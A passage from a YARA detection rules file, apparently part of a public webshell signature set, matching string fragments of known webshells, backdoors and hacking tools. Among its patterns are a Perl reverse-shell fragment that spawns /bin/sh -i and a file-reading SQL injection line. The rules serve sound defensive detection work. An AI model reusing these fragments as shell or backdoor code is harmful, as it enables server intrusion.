		logic_hash = "48c70413c71d5a84f8cea48c77935b7cc26d9e1348d7ab257de4540d69f0f817"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "unable to connect to "
		$s8 = "backdoor is corrupted on "

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_2005Red
{
	meta:
		description = "Webshells Auto-generated - file 2005Red.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7756-L7769"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d8ccda2214b3f6eabd4502a050eb8fe8"
		logic_hash = "716b6faa8d1216f592d63b658cdd65d7be0226bf746b5fdf1827bdf881562711"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "scrollbar-darkshadow-color:#FF9DBB;"
		$s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006X2
{
	meta:
		description = "Webshells Auto-generated - file 2006X2.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7770-L7782"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cc5bf9fc56d404ebbc492855393d7620"
		logic_hash = "0df587ccaf41d11c6be90ef631ce8b21f95f08fa8f71e62463c378455b312f4a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Powered By "
		$s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."

	condition:
		all of them
}

rule SIGNATURE_BASE_Rdrbs084
{
	meta:
		description = "Webshells Auto-generated - file rdrbs084.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "97548273-6894-5c9f-8cca-d966ce770ada"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7783-L7795"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ed30327b255816bdd7590bf891aa0020"
		logic_hash = "8a743d62723c4a5f863f986edd4b149728680b40d6a4b9a99b093d62ccb70cf8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Create mapped port. You have to specify domain when using HTTP type."
		$s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Caseswitch_2005
{
	meta:
		description = "Webshells Auto-generated - file 2005.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0f2b8e71-1c11-5efe-bee7-146168aec369"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7796-L7814"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8bf667ee9e21366bc0bd3491cb614f41"
		logic_hash = "0ecf28b5abb918cd1d8f38b76019dddf19dff5dbb114f16ef6ec9b46cb590a46"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "MSComDlg.CommonDialog"
		$s2 = "CommonDialog1"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s5 = "EVENT_SINK_AddRef"
		$s6 = "By Marcos"
		$s7 = "EVENT_SINK_QueryInterface"
		$s8 = "MethCallEngine"

	condition:
		all of them
}

rule SIGNATURE_BASE_Ebayid_Index3
{
	meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4fc30150-7b44-53c4-888c-faf651495407"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7815-L7826"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0412b1e37f41ea0d002e4ed11608905f"
		logic_hash = "47660cb71d6787683e51aa14fc0f4a9d6f1c59517b77bfe4135098a0020ded11"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phvayv
{
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "07e027a6-01a5-5250-a35e-fbfef1449cfe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7827-L7838"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "205ecda66c443083403efb1e5c7f7878"
		logic_hash = "d0482607f7d9cf6c89963cb9b1f943fa0b80636e857e0fb044cd9a0b3f974deb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byshell063_Ntboot
{
	meta:
		description = "Webshells Auto-generated - file ntboot.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7d1f39f6-04f1-51ee-b125-c35af8ae4c0c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7839-L7853"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "99b5f49db6d6d9a9faeffb29fd8e6d8c"
		logic_hash = "2fdc930eacb87d02ebe69a2b64df4103bd0f3417a76f1b2922b3d4cd4c0dffe9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtBoot"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "Dumping Description to Registry..."
		$s3 = "Opening Service .... Failure !"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Casus15_2
{
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d3f67fe9-a93f-504a-8b14-a815135d562f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7854-L7865"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8d155b4239d922367af5d0a1b89533a3"
		logic_hash = "45820e0398cca8e75fc4acf6863d962a817afd95a4592acd4ac4a50029684220"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "copy ( $dosya_gonder"

	condition:
		all of them
}

rule SIGNATURE_BASE_Installer
{
	meta:
		description = "Webshells Auto-generated - file installer.cmd"
		author = "Florian Roth (Nextron Systems)"
		id = "681d8284-55e5-5316-a0d2-f4f13218df76"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7866-L7878"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a507919ae701cf7e42fa441d3ad95f8f"
		logic_hash = "73c1032313155ceb752fe2f94c8d242833127fe0443d7e3044fa1de2b2b7742b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Restore Old Vanquish"
		$s4 = "ReInstall Vanquish"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remview_2
{
	meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "8e0492e8-d683-5c2d-b1ce-6c8344b874af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7879-L7891"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b4a09911a5b23e00b55abe546ded691c"
		logic_hash = "0a682431f7044e9a49c8dd4842a22c521e2a07d5df045b0a12449e3b3206716b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<xmp>$out</"
		$s1 = ".mm(\"Eval PHP code\")."

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_R57
{
	meta:
		description = "Webshells Auto-generated - file r57.php"
		author = "Florian Roth (Nextron Systems)"
		id = "14092413-27a4-5b7d-9023-0b53b3d45a12"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7892-L7903"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "903908b77a266b855262cdbce81c3f72"
		logic_hash = "8d0f3b2009594d4aa413c4794dca12e3c66a19974cc6d0b47cc3f5e2572a4c57"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006X
{
	meta:
		description = "Webshells Auto-generated - file 2006X.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7904-L7916"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cf3ee0d869dd36e775dfcaa788db8e4b"
		logic_hash = "b71cf90900c7eae4caef57564292ca497a2c6c77e3de2994ba9e4cecae7f2697"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input name=\"password\" type=\"password\" id=\"password\""
		$s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phvayv_2
{
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "8bd52f9b-a232-566d-90ab-4085933cdc65"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7917-L7928"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "205ecda66c443083403efb1e5c7f7878"
		logic_hash = "11418a11692412ccb309983bdadd9bda2b27b692c3282eb0386094e76c7ba1e0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"

	condition:
		all of them
}

rule SIGNATURE_BASE_Elmaliseker
{
	meta:
		description = "Webshells Auto-generated - file elmaliseker.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7929-L7941"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ccf48af0c8c09bbd038e610a49c9862e"
		logic_hash = "54c0b8e74a9b10fe54901c0595600af1dfc54abd3f710fc20ca87ca92236bb49"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "javascript:Command('Download'"
		$s5 = "zombie_array=array("

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Resolve
{
	meta:
		description = "Webshells Auto-generated - file resolve.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dcdb9952-63fc-57a7-ae17-ffe8ac4271f1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7942-L7959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "69bf9aa296238610a0e05f99b5540297"
		logic_hash = "39d8ac274e94f13b5eb197be5827a95ac09df70793bd584c96b81983a565c1ce"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "3^n6B(Ed3"
		$s1 = "^uldn'Vt(x"
		$s2 = "\\= uPKfp"
		$s3 = "'r.axV<ad"
		$s4 = "p,modoi$=sr("
		$s5 = "DiamondC8S t"
		$s6 = "`lQ9fX<ZvJW"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remexp
{
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "48a262bf-7f48-5ed9-b043-80e9d563bf21"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7960-L7973"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		logic_hash = "b9b966a89ab097494d7af90775bf124f1310c77145be67fa57ebdacd0164e3d0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
		$s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
		$s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Tool
{
	meta:
		description = "Webshells Auto-generated - file tool.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "ed744aa4-7a35-57d6-89bd-3286a21b50a0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7974-L7985"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3a1e1e889fdd974a130a6a767b42655b"
		logic_hash = "a3449aca3124aa4d920d78e5e674ddd9d8a181b0ce0143032352a69dfdbcad2d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "\"\"%windir%\\\\calc.exe\"\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_2005
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "91d278d5-e9ec-5a28-9a54-4549b4f0cd07"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7986-L7998"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "97f2552c2fafc0b2eb467ee29cc803c8"
		logic_hash = "4d04174b23c9057acf2618c01cd702eaaec2d3508a8c25dd87fdd320c076a3b1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
		$s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byloader
{
	meta:
		description = "Webshells Auto-generated - file byloader.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "24940e4b-06eb-548d-9e14-1a8f9c864bd3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7999-L8014"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0f0d6dc26055653f5844ded906ce52df"
		logic_hash = "66c900e4bc771fb23d7623e57ad51edaa95696c2e31554720582f3e33a1b2e25"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtfsChk"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "NTFS Disk Driver Checking Service"
		$s3 = "Dumping Description to Registry..."
		$s4 = "Opening Service .... Failure !"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Fport
{
	meta:
		description = "Webshells Auto-generated - file Fport.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "664e7b19-4d0b-5062-97d2-0eb34869024d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8015-L8027"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dbb75488aa2fa22ba6950aead1ef30d5"
		logic_hash = "b9dc66e249c0577839cc3748f129c343d2ccb7327b92a2a67e4467782d10a25e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "Copyright 2000 by Foundstone, Inc."
		$s5 = "You must have administrator privileges to run fport - exiting..."

	condition:
		all of them
}

rule SIGNATURE_BASE_Backdoor__Fr_
{
	meta:
		description = "Webshells Auto-generated - file BackDooR (fr).php"
		author = "Florian Roth (Nextron Systems)"
		id = "fd0c77e8-18b7-5eb4-8ed4-87ee4c864683"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8028-L8039"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a79cac2cf86e073a832aaf29a664f4be"
		logic_hash = "6c16c200712015eed71aeb119e46bad5f93445a8f719d98ef31f9012cb3551ae"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include "

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Ntdaddy
{
	meta:
		description = "Webshells Auto-generated - file ntdaddy.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "b6b655b8-7bce-5fa5-97b7-a020a7e53f4f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8040-L8051"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f6262f3ad9f73b8d3e7d9ea5ec07a357"
		logic_hash = "4df6f53ee9bfc0214e69dd858878026e962b90573ed48a5ffdd5523538e8f3bf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"

	condition:
		all of them
}

rule SIGNATURE_BASE_Nstview_Nstview
{
	meta:
		description = "Webshells Auto-generated - file nstview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "00df601c-bddb-5da8-bef4-d2122419b5d0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8052-L8063"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3871888a0c1ac4270104918231029a56"
		logic_hash = "2b25e22d86a672af0b8957f1b0336ed80e09f3389f5045c230af2372db0e3415"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Upload
{
	meta:
		description = "Webshells Auto-generated - file upload.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "43054993-b0dd-5d2e-9890-db1f47759be5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8064-L8075"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b09852bda534627949f0259828c967de"
		logic_hash = "312020a72a37adb0111ac6d61810c8e476be39dc6456e80e83cd6a680e8ea051"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageUpload Below -->"

	condition:
		all of them
}

rule SIGNATURE_BASE_Passwordreminder
{
	meta:
		description = "Webshells Auto-generated - file PasswordReminder.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "642033ee-4454-5913-8348-4d1579fc0bd8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8076-L8087"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ea49d754dc609e8bfa4c0f95d14ef9bf"
		logic_hash = "f3da5381f5e352c541654d2af918ca8cea8049d137078670dd0538a4d13f676e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."

	condition:
		all of them
}

rule SIGNATURE_BASE_Pack_Injectt
{
	meta:
		description = "Webshells Auto-generated - file InjectT.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3a640c22-0cd4-5ab1-9216-c68625d7d505"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8088-L8103"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "983b74ccd57f6195a0584cdfb27d55e8"
		logic_hash = "9f66b7b429ed585888c0fb4943bb12262247b3af8d85bc67309b27752171e66a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "ail To Open Registry"
		$s4 = "32fDssignim"
		$s5 = "vide Internet S"
		$s6 = "d]Software\\M"
		$s7 = "TInject.Dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remexp_2
{
	meta:
		description = "Webshells Auto-generated - file RemExp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "501544d5-fe52-5933-8782-516ffe18f3ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8104-L8116"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b69670ecdbb40012c73686cd22696eeb"
		logic_hash = "e31e25a7c2b2e970a379a61d2dac335bd37cac48328eee9f3966ff5c77ef6f18"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = " Then Response.Write \""
		$s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_C99
{
	meta:
		description = "Webshells Auto-generated - file c99.php"
		author = "Florian Roth (Nextron Systems)"
		id = "0b176370-a5ab-587a-b0e9-ef4fe5c604bd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8117-L8128"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5f9ba02eb081bba2b2434c603af454d0"
		logic_hash = "de769299bbd8b895b84db757fcc037b807f7caaa624c06e9d330934a968b2381"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rknt_Zip_Folder_Rknt
{
	meta:
		description = "Webshells Auto-generated - file RkNT.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "a58a3b33-8096-535a-b930-2eb71347edb8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8129-L8146"
